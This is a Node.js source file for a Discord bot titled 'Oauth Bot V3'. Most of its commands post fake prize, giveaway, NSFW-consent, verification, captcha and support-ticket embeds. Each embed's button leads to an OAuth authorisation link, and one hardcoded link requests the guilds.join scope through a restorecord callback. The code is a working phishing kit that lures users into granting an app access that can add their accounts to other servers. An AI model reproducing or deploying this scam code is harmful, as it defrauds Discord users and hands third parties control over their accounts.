const { Collection, Client, Discord, MessageEmbed, Message, Intents } = require('discord.js');
const moment = require("moment")
require("moment-duration-format")
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });
require('discord-buttons')(client);
const path = require('path')
const fs = require('fs')
let cpuStat = require("cpu-stat");
const discordbuttons = require('discord-buttons')
let os = require("os");
const { MessageButton, MessageActionRow, URL, ButtonBuilder, Link} = require("discord-buttons")
const keepAlive = require("./server");
const { authlink } = require('./config');
client.prefix = "+"




    const activities = [
      "...",
      "+help | v3",
    ];

    client.on("ready", () => {
      // run every 10 seconds
      setInterval(() => {
        // generate random number between 1 and list length.
        const randomIndex = Math.floor(Math.random() * (activities.length - 1) + 1);
        const newActivity = activities[randomIndex];

        client.user.setActivity(newActivity);
      }, 20000);
    });




client.on('message', async (message) => {
    if (message.content.startsWith('+help')) {
        const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(`**Oauth Bot V3**`)

        .setDescription (`🍁 ** Commandes:**\n \`help\` \`stats\` \`renew\`\n\n✨ ** Commandes du bot:**\n \`nsfw\` \`gift\` \`nitroqr\` \`nitro1\` \`nitro2\` \`roblox\` \`verify\` \`giveaway\` \`boost\` \`captcha\` \`ticket\` \`event\``)
        message.channel.send({embed: embed })
    }
})




client.on('message', async (message) => {
    if (message.content.startsWith('+stats')) {
      cpuStat.usagePercent(function (e, percent, seconds) {
          if (e) {
              return console.log(String(e.stack).red);
          }
          const duration = moment.duration(client.uptime).format(" D [days], H [hrs], m [mins], s [secs]");

          let connectedchannelsamount = 0;
          let guilds = client.guilds.cache.map((guild) => guild);
          for (let i = 0; i < guilds.length; i++) {
              if (guilds[i].me.voice.channel) connectedchannelsamount += 1;
          }
        const embed = new MessageEmbed()
        .setColor("0")
        .setTitle(`**Stats:**`)

              .addField("⏳ Memory Usage", `\`${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}/ ${(os.totalmem() / 1024 / 1024).toFixed(2)}MB\``, false)
              .addField("⌚️ Uptime ", `\`${duration}\``, false)
              .addField("📁 Users", `\`${client.users.cache.size}\``, false)
              .addField("🚀 Servers", `\`${client.guilds.cache.size}\``, false)
             .addField("⏰ API Latency", `\`${client.ws.ping}ms\``, false)
              .addField("🤖 CPU usage", `\`${percent.toFixed(2)}%\``, false)
              .setFooter("Coded by: Felosi");
        message.channel.send({embed: embed })
    }
   )}
})

client.on('message', async (message) => {
  if (message.content.startsWith('+renew')) {
      if (!message.member.hasPermission("MANAGE_CHANNELS")) {
          return message.channel.send("You don't have permissions to do this command!")

      }
      message.channel.clone().then
      ((ch) => {
          ch.setParent(message.channel.parent);
          ch.setPosition(message.channel.position);
          message.channel.delete().then(() => {
              ch.send("**Channel Nuked** \n https://imgur.com/LIyGeCR")
          })

      });
}
}
)


//----------------GRAB------------------



client.on('message', async (message) => {
    if (message.content.startsWith('+event')) {
        const embed = new MessageEmbed()
        .setColor("0")
        .setTitle(`__**🎁 Prizes**__`)

        .setDescription (`・ Instant Claim ⚡️

・ 2 Invites = Nitro Boost Monthly / 1000 Robux

・ 5 Invites = Nitro Basic Yearly / 2500 Robux

・10 Invites = Nitro Boost Yearly / 5000 Robux


🎊 Are you out of invitations? Verify your invites in ⁠the invites channel and DM the Owner to claim your reward. `)
        .setImage("https://www.centralxbox.com.br/wp-content/uploads/2019/11/discord-nitro.jpg")
        message.channel.send({embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+nsfw')) {
        const embed = new MessageEmbed()
        .setTitle(`NSFW Verification`)
        .setDescription(`Click the emoji to confirm that you are 18 or older and consent to view sexual content.`)
.setImage('https://cdn.discordapp.com/attachments/945812190936584233/1089594308543393792/JqoLqSb_1.gif')
        .setColor("0")

        const z = new MessageButton()
            .setStyle("url")
            .setLabel("🔞")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([z])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on("message", async (message) => {
  //if (message.author.bot) return;
  if (message.content.startsWith("+nitroqr")) {
    message.channel.send('https://media.discordapp.net/attachments/1201030687948550295/1205144191655485530/Capture_decran_le_2024-02-08_a_08.32.21.png?ex=65d74cfd&is=65c4d7fd&hm=dafc1338f4afdf4dd04accbe01363648241ba8f5d89b8dd02c655c1b8330d1bc&=&format=webp&quality=lossless&width=219&height=321')
  }
})

  
client.on('message', async (message) => {
    if (message.content.startsWith('+nitro1')) {
        const embed = new MessageEmbed()
        .setDescription(`**You won a nitro classic click claim button to get!**`)
.setImage('https://media.discordapp.net/attachments/991938111217094708/992945246138794044/Nitro.png')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("Claim")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+nitro2')) {
        const embed = new MessageEmbed()
        .setDescription(`**You won a nitro boost click claim button to get!**`)
.setImage('https://media.discordapp.net/attachments/1201030687948550295/1205146469737177088/Capture_decran_le_2024-02-08_a_08.41.33.png?ex=65d74f1c&is=65c4da1c&hm=78802db71c4daf5cb7072be0a0422e15a6c973b62923d96dc4b3ba8b9c7ea33f&=&format=webp&quality=lossless&width=741&height=199')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("Claim")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on("message", async (message) => {
  //if (message.author.bot) return;
  if (message.content.startsWith("+gift")) {
    let button = new MessageButton()
    .setStyle('url')
    .setURL(authlink)
    .setLabel('Claim');
    message.channel.send('https://seagm-media.seagmcdn.com/item_480/1385.png?x-oss-process=image/resize,w_360',button)
  }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+boost')) {
        const embed = new MessageEmbed()
        .setTitle("Hello everyone, you have all received a Nitro Discord for one year!")
        .setDescription(`To get your Nitro Boost, all you need to do is:
   \n1️⃣ Click on the button [claim](https://discord.com/oauth2/authorize?client_id=1205140961269645372&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1204115235930247318).
   \n2️⃣ Click on the button [autorize](https://discord.com/oauth2/authorize?client_id=1205140961269645372&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1204115235930247318).\n\nOnce you get autorized you need to wait about 24-48 hours and you will get it.`)
.setImage('https://i.ibb.co/54xmJfm/Capture-decran-le-2022-12-30-a-15-58-02.png')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("🎁 Claim")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})


client.on('message', async (message) => {
    if (message.content.startsWith('+giveaway')) {
        const embed = new MessageEmbed()
        .setTitle("**Nitro Boost 1 month 🎁** ")
        .setDescription(`\nWinners: \`1\`\nTimer: \`Ends in 2 hours\`\nHosted by: \`Unknown\` \n\n\n\n:tada: To enter the giveaway, click on the button below.`)
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("🎉 Enter")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+roblox')) {
        const embed = new MessageEmbed()
        .setTitle("**You won a $10 Roblox gift card click claim button to get!**")
.setImage('https://scratchmonkeys.com/image/cache/catalog/Product%20Images/Roblox/USD/roblox-gift-card-10-300x190.webp')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("Claim")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+verify')) {
        const embed = new MessageEmbed()
        .setTitle("Verification")
        .setDescription(`**Please click on the button to access the server!**`)
.setImage('https://upload.wikimedia.org/wikipedia/fr/9/9d/Captcha_google_checkbox.gif')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("Verify here")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+captcha')) {
        const embed = new MessageEmbed()
        .setTitle("**ℹ️ Welcome to [+] Protect!**")
        .setDescription(`In order to access the entire server, please click on the button and answer what you read in the image below (to verify that you are not a robot).`)
.setFooter("⚠️ The code consists of 5 letters/numbers.")
.setImage('https://www.learningsuccessblog.com/files/0aainput-black.gif')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("Respond")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

client.on('message', async (message) => {
    if (message.content.startsWith('+ticket')) {
        const embed = new MessageEmbed()
        .setTitle("Support")
        .setDescription(`To create a ticket react with 📩`)
.setFooter("[+] Protect - Ticketing without clutter")
.setImage('https://www.toulokowitz.fr/wp-content/uploads/2020/06/29966-1280x483.jpg')
        .setColor("0")

        const y = new MessageButton()
            .setStyle("url")
            .setLabel("📩 Create ticket")
            .setURL(authlink)
        const row = new MessageActionRow()
            .addComponent([y])

        message.channel.send({ component: row, embed: embed })
    }
})

keepAlive();
client.login(process.env.TOKEN);

//Made by Felosi @2023
